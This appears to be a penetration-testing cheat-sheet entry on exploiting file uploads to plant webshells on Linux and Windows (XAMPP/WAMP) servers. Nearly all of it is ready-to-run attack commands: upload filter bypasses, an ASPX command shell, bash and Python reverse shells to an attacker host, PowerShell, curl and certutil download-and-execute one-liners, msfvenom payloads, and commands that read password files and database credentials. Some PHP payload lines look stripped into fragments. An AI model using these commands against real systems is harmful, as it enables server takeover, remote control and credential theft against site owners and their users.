title: File Upload → Webshell
body: Two problems to solve: (1) get the file accepted, (2) find where it landed. Work them in parallel. Check source code and intercept responses for upload paths before fuzzing blind.
cmd: # ── STEP 1: FIND WHERE FILES GO ─────────────────────── # Check the page source BEFORE uploading — look for hints curl -s http://$ip/upload.php | grep -i "upload\|path\|dir\|folder\|dest" # After uploading a test file, check the response # Burp: look at the response body for a URL or path # Common paths to check immediately: curl http://$ip/uploads/test.txt curl http://$ip/upload/test.txt curl http://$ip/files/test.txt curl http://$ip/images/test.txt curl http://$ip/media/test.txt curl http://$ip/assets/test.txt curl http://$ip/static/test.txt curl http://$ip/data/test.txt curl http://$ip/tmp/test.txt curl http://$ip/temp/test.txt # Fuzz for the upload directory after uploading ffuf -u http://$ip/FUZZ/test.txt \ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \ -mc 200 -fs 0 # If filename is preserved — fuzz with your filename ffuf -u http://$ip/FUZZ/shell.php \ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \ -mc 200 # Check if app reveals path in response headers or body curl -v http://$ip/upload.php -X POST -F "file=@test.txt" 2>&1 | grep -i "location\|path\|url\|href" # ── DID IT ACTUALLY EXECUTE? (diagnose before you flail) ── # curl the uploaded file RAW — don't trust the browser (it tries to render a # .jpg and shows "image has errors", which masks what's really happening): curl -s 'http://$ip/uploads/shell.phtml?cmd=id' # returns id/whoami output → EXECUTING, you're in (match the ?param!) # returns your literal → STATIC, PHP is NOT running on that ext # # Static → the extension isn't mapped to PHP. Recognition + fixes: # • Middle-extension (shell.php3.jpg) only runs on Apache wired with # AddHandler/mod_mime multi-ext matching. If it serves as image/jpeg, # this box ISN'T — stop trying .xxx.jpg variants. # • .htaccess route (Apache + AllowOverride, which these boxes usually have): # upload a .htaccess into /uploads/ mapping an allowed ext to PHP, then # upload your shell as that ext: # echo 'AddType application/x-httpd-php .jpg' > .htaccess # now shell.jpg executes as PHP. # • Or find an allowed-AND-executable ext the blacklist missed (.phtml, # .phar, .pht) — webshell-forge -b stamps them all + writes an ffuf list. # # PARAM MISMATCH: shell reads $_GET['cmd'] but you're hitting ?c= or ?= — a # blank 200 with no output is the WRONG PARAM NAME, not a broken shell. # WINDOWS TARGET: use a Windows payload (encoded PS), not a Linux revshell. # ── STEP 2: PHP WEBSHELL PAYLOADS ───────────────────── # Simple command execution — GET parameter # POST parameter (harder to detect in logs) # Both GET and POST # Passthru — alternative to system() # Shell_exec — returns output as string # Exec — only returns last line # Full featured — accepts cmd via POST, shows output '.shell_exec($_POST['cmd']).'';}?> # One-liner reverse shell via webshell # First: set up listener: sudo nc -lvnp 443 # Then hit: http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261' # ── STEP 3: BYPASS FILTER — EXTENSION ──────────────── # Try in order: .php .php3 .php4 .php5 .php7 .phtml .phar .shtml .cgi # Double extension (server processes first dot) shell.php.jpg shell.php.png shell.php.gif # Null byte — older PHP/servers shell.php%00.jpg shell.php�.jpg # Case variation shell.PHP shell.Php shell.pHp # ── STEP 4: BYPASS FILTER — CONTENT-TYPE ───────────── # In Burp — change Content-Type header after upload accepted # Change: application/x-php # To: image/jpeg OR image/png OR image/gif # curl with spoofed content type curl http://$ip/upload.php \ -F "file=@shell.php;type=image/jpeg" # ── STEP 5: MAGIC BYTES BYPASS ─────────────────────── # Prepend image magic bytes so file reads as an image # GIF89a — most common bypass printf 'GIF89a ' > shell.php.gif # PNG magic bytes printf 'PNG  ' > shell.png.php # JPEG magic bytes printf 'ÿØÿ' > shell.jpg.php # exiftool — embed PHP in image metadata exiftool -Comment='' image.jpg mv image.jpg shell.php.jpg # ── STEP 6: EXECUTE THE SHELL ───────────────────────── # Simple command test curl "http://$ip/uploads/shell.php?cmd=id" curl "http://$ip/uploads/shell.php?cmd=whoami" curl "http://$ip/uploads/shell.php?cmd=ls+-la" # URL encode spaces and special chars curl "http://$ip/uploads/shell.php?cmd=cat+/etc/passwd" curl "http://$ip/uploads/shell.php?cmd=cat%20/etc/passwd" # POST method curl -X POST http://$ip/uploads/shell.php -d "cmd=id" # ── STEP 7: UPGRADE TO REVERSE SHELL ───────────────── # Listener on Kali sudo nc -lvnp 443 # Bash reverse shell via webshell (URL encoded) curl "http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'" # Python reverse shell via webshell curl "http://$ip/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("$lhost",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'" # Serve shell.sh and execute it echo 'bash -i >& /dev/tcp/$lhost/443 0>&1' > shell.sh python3 -m http.server 8000 # Then via webshell: curl "http://$ip/uploads/shell.php?cmd=curl+http://$lhost:8000/shell.sh|bash" # ── STEP 8: WINDOWS ASPX / ASP SHELLS ──────────────── # ASPX webshell — use for IIS targets # msfvenom generated: msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=$lhost LPORT=443 -f aspx -o shell.aspx # Simple ASPX cmd shell (copy-paste) # <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %> # <% Response.Write(new Process(){StartInfo=new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()); %> # Execute curl "http://$ip/uploads/shell.aspx?cmd=whoami" # ══════════════════════════════════════════════════ # WINDOWS PHP UPLOAD → REVERSE SHELL (XAMPP / WAMP) # ══════════════════════════════════════════════════ # XAMPP serves PHP from: C:\xampp\htdocs\ # WAMP serves from: C:\wamp\www\ or C:\wamp64\www\ # Uploads land in: C:\xampp\htdocs\\uploads\ # Your shell runs as: SYSTEM or the XAMPP service user (often high priv) # ── STEP 1: UPLOAD A WINDOWS-AWARE WEBSHELL ───── # The standard Linux shell: # WORKS on Windows — system() calls cmd.exe, not bash. # But: /dev/tcp, bash -i >& and | bash ALL FAIL on Windows. # Confirm it's Windows first — trigger via the webshell: # http:///uploads/shell.php?cmd=whoami # -> nt authority\system or \ = Windows confirmed # ── STEP 2: VERIFY EGRESS ─────────────────────── # On Kali: python3 -m http.server 80 # http:///uploads/shell.php?cmd=powershell+-c+"Invoke-WebRequest+http:///test" # GET /test appearing on Kali = confirmed outbound HTTP # Also try ping: http:///uploads/shell.php?cmd=ping+-n+2+ # ── STEP 3: GET A REVERSE SHELL ───────────────── # Method A — PowerShell download + exec (most reliable): # On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o shell.exe python3 -m http.server 80 nc -lvnp # Trigger via webshell URL: # http:///uploads/shell.php?cmd=powershell+-c+"(New-Object+Net.WebClient).DownloadFile('http:///shell.exe','C:\Windows\Temp\shell.exe');+C:\Windows\Temp\shell.exe" # Method B — PowerShell IEX (no binary on disk): # On Kali: cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1 echo "Invoke-PowerShellTcp -Reverse -IPAddress -Port " >> shell.ps1 python3 -m http.server 80 nc -lvnp # Trigger: # http:///uploads/shell.php?cmd=powershell+-nop+-w+hidden+-c+"IEX(New-Object+Net.WebClient).DownloadString('http:///shell.ps1')" # Method C — certutil (when PowerShell is blocked): # http:///uploads/shell.php?cmd=certutil+-urlcache+-f+http:///shell.exe+C:\Windows\Temp\shell.exe # http:///uploads/shell.php?cmd=C:\Windows\Temp\shell.exe # Method D — SMB execute (no HTTP, no disk write): # On Kali: impacket-smbserver Share . -smb2support # http:///uploads/shell.php?cmd=\\\Share\shell.exe # ── STEP 4: IF POWERSHELL IS RESTRICTED ───────── # Check execution policy: # http:///uploads/shell.php?cmd=powershell+Get-ExecutionPolicy # Bypass it inline (no permanent change): # powershell -ExecutionPolicy Bypass -c "..." # Or encode the command (-EncodedCommand): # python3 -c "import base64; print(base64.b64encode('IEX(...).ps1'.encode('utf-16-le')).decode())" # powershell -EncodedCommand # ── STEP 5: XAMPP-SPECIFIC LOOT PATHS ────────── # XAMPP config (DB creds): # http:///uploads/shell.php?cmd=type+C:\xampp\phpMyAdmin\config.inc.php # http:///uploads/shell.php?cmd=type+C:\xampp\php\php.ini # http:///uploads/shell.php?cmd=dir+C:\xampp\htdocs\ # MySQL root (XAMPP default = root / no password): # http:///uploads/shell.php?cmd=C:\xampp\mysql\bin\mysql.exe+-u+root+-e+"SELECT+user,password+FROM+mysql.user;" # ── COMMON MISTAKES ON WINDOWS PHP UPLOAD ─────── # WRONG: bash -i >& /dev/tcp/... — /dev/tcp doesn't exist on Windows # WRONG: curl ... | bash — bash isn't in PATH on stock Windows # WRONG: chmod +x — not a Windows command # RIGHT: certutil / PowerShell DownloadFile / SMB pull # RIGHT: cmd.exe is the shell; test with: whoami, dir, systeminfo, type # Web app source/config exposure via directory listing # PHP apps frequently expose DB creds and schema when directories list openly. # After feroxbuster, check every listed directory for: # Connection files (DB creds in plaintext): curl http:///conn.php curl http:///config/database.php curl http:///includes/conn.php # SQL dump (schema + sample data, sometimes user hashes): curl http:///DB/apsystem.sql # apsystem common location curl http:///db/install.sql # grep for INSERT INTO users / passwords in the dump # Third-party libraries with known CVEs: curl -s http:///tcpdf/tcpdf.php # tcpdf — old versions have RCE curl -s http:///tcpdf/ | grep version # CMS fingerprinting — version number in source or generator meta: curl -s http:/// | grep -i "generator\|powered.by\|version" # Nicepage 4.8.x → searchsploit "nicepage" for known issues # wamp/xampp stack → PHP version + Apache version → version-specific vulns
warn: Always check the HTTP response after uploading — the path is often in the response body or Location header. If you can't find the upload dir, upload a unique filename then fuzz for it. Magic bytes bypass works when server checks file content but not extension. exiftool embed is stealthier than a naked PHP file.
